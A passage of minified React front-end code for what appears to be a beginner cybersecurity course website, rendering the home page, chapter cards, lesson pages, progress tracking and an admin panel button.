${k?.id===R.id?"active":""}`,onClick:()=>ve(R),children:[ce.includes(R.id)?s.jsx(tl,{size:18,className:"nav-item-icon",style:{color:"var(--accent-green)"}}):s.jsx(ni,{size:18,className:"nav-item-icon"}),s.jsx("span",{children:R.title})]},R.id))]},O.id))]}),s.jsxs("div",{style:{marginTop:"auto",padding:"20px",borderTop:"1px solid var(--border-color)"},children:[s.jsxs("div",{style:{display:"flex",justifyContent:"space-between",marginBottom:"8px",fontSize:"14px",color:"var(--text-secondary)"},children:[s.jsx("span",{children:"Progress"}),s.jsxs("span",{children:[mt,"%"]})]}),s.jsx("div",{className:"progress-bar",children:s.jsx("div",{className:"progress-fill",style:{width:`${mt}%`}})})]})]}),s.jsxs("main",{className:"main-content",children:[X==="home"&&s.jsxs(s.Fragment,{children:[s.jsxs("div",{className:"hero",children:[s.jsxs("div",{className:"hero-badge",children:[s.jsx(Os,{size:16}),s.jsx("span",{children:"Cybersecurity Course"})]}),s.jsxs("h1",{className:"hero-title",children:["Learn",s.jsx("br",{}),s.jsx("span",{children:"Cybersecurity"})]}),s.jsx("p",{className:"hero-subtitle",children:"Understand how hackers think, protect yourself online, and start your ethical hacking journey. No experience required!"}),s.jsxs("button",{className:"nav-button primary",onClick:()=>ve(Qt.chapters[0].lessons[0]),style:{margin:"0 auto"},children:[s.jsx(Mp,{size:20}),"Start Learning"]})]}),s.jsxs("div",{style:{marginBottom:"48px"},children:[s.jsx("h2",{style:{fontSize:"28px",fontWeight:"700",marginBottom:"24px"},children:"Course Chapters"}),Qt.chapters.map(O=>{const R=O.lessons.filter(H=>ce.includes(H.id)).length,D=jh[O.id];return s.jsxs("div",{className:"chapter-card",onClick:()=>ve(O.lessons[0]),style:{flexDirection:"column",padding:0,overflow:"hidden"},children:[D&&s.jsxs("div",{style:{width:"100%",height:"160px",overflow:"hidden",position:"relative"},children:[s.jsx("img",{src:`/cybersecurity-learning/${D.src.slice(1)}`,alt:D.alt,loading:"lazy",style:{width:"100%",height:"100%",objectFit:"cover",objectPosition:"center",transition:"transform 0.3s ease"}}),s.jsx("div",{style:{position:"absolute",bottom:0,left:0,right:0,height:"40px",background:"linear-gradient(transparent, var(--bg-card))"}})]}),s.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"16px",padding:"16px 20px",width:"100%"},children:[s.jsx("div",{className:"chapter-number",children:O.id}),s.jsxs("div",{className:"chapter-info",children:[s.jsx("div",{className:"chapter-title",children:O.title}),s.jsxs("div",{className:"chapter-meta",children:[O.description," • ",O.lessons.length," lessons",R>0&&s.jsxs("span",{style:{color:"var(--accent-green)",marginLeft:"8px"},children:["(",R,"/",O.lessons.length," complete)"]})]})]}),s.jsx(ii,{size:24,style:{color:"var(--text-muted)"}})]})]},O.id)})]}),s.jsxs("div",{className:"glass-card",style:{textAlign:"center"},children:[s.jsx("h3",{style:{marginBottom:"16px",fontSize:"20px"},children:"What You'll Learn"}),s.jsx("p",{style:{color:"var(--text-secondary)",marginBottom:"24px"},children:"By the end, you'll understand how real attacks work and how to defend against them:"}),s.jsx("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(150px, 1fr))",gap:"16px"},children:["Password Security","Phishing Defense","Encryption","Network Scanning","Web Hacking","CTF Challenges"].map(O=>s.jsxs("div",{style:{padding:"16px",background:"rgba(239, 68, 68, 0.1)",borderRadius:"12px",border:"1px solid rgba(239, 68, 68, 0.2)"},children:[s.jsx(tl,{size:24,style:{color:"var(--accent-red)",marginBottom:"8px"}}),s.jsx("div",{style:{fontWeight:"500"},children:O})]},O))})]})]}),X==="lesson"&&k&&s.jsxs("div",{className:"lesson-container",children:[s.jsxs("div",{className:"lesson-header",children:[s.jsxs("div",{className:"lesson-breadcrumb",children:[s.jsx("a",{href:"#",onClick:O=>{O.preventDefault(),m("home")},children:"Home"}),s.jsx(ii,{size:16}),s.jsx("span",{children:k.title})]}),s.jsx("h1",{className:"lesson-title",children:k.title}),s.jsxs("div",{className:"lesson-meta",children:[s.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"6px"},children:[s.jsx(io,{size:16}),k.duration]}),ce.includes(k.id)&&s.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"6px",color:"var(--accent-green)"},children:[s.jsx(tl,{size:16}),"Completed"]})]})]}),(()=>{const O=parseInt(k.id),R=jh[O];return R?s.jsxs("div",{className:"infographic-container",children:[s.jsxs("div",{className:"infographic-badge",children:[s.jsx(jp,{size:14}),s.jsxs("span",{children:["Chapter ",O," Infographic"]})]}),s.jsx("img",{src:`/cybersecurity-learning/${R.src.slice(1)}`,alt:R.alt,className:"infographic-image",loading:"lazy",onClick:D=>D.target.classList.toggle("expanded")}),s.jsx("p",{className:"infographic-caption",children:"👆 Tap to expand"})]}):null})(),s.jsx("div",{className:"lesson-content",children:tt(k.content)}),!ce.includes(k.id)&&s.jsxs("button",{className:"nav-button primary",style:{width:"100%",justifyContent:"center",marginTop:"32px"},onClick:()=>Ge(k.id),children:[s.jsx(tl,{size:20}),"Mark as Complete"]}),s.jsxs("div",{className:"lesson-nav",children:[G()?s.jsxs("button",{className:"nav-button",onClick:()=>ve(G()),children:[s.jsx(ii,{size:20,style:{transform:"rotate(180deg)"}}),"Previous"]}):s.jsx("div",{}),st()?s.jsxs("button",{className:"nav-button primary",onClick:()=>ve(st()),children:["Next Lesson",s.jsx(ii,{size:20})]}):s.jsxs("button",{className:"nav-button primary",onClick:()=>m("home"),children:["Finish Course",s.jsx(tl,{size:20})]})]})]})]}),s.jsx("button",{className:"admin-trigger",onClick:()=>C(!0),title:"Admin Panel",children:s.jsx(so,{size:24})}),s.jsx(t1,{courseData:Qt,isOpen:q,onClose:()=>{C(!1),window.location.hash=""}})]})}Vy.createRoot(document.getElementById("root")).render(s.jsx(F.StrictMode,{children:s.jsx(l1,{})}));
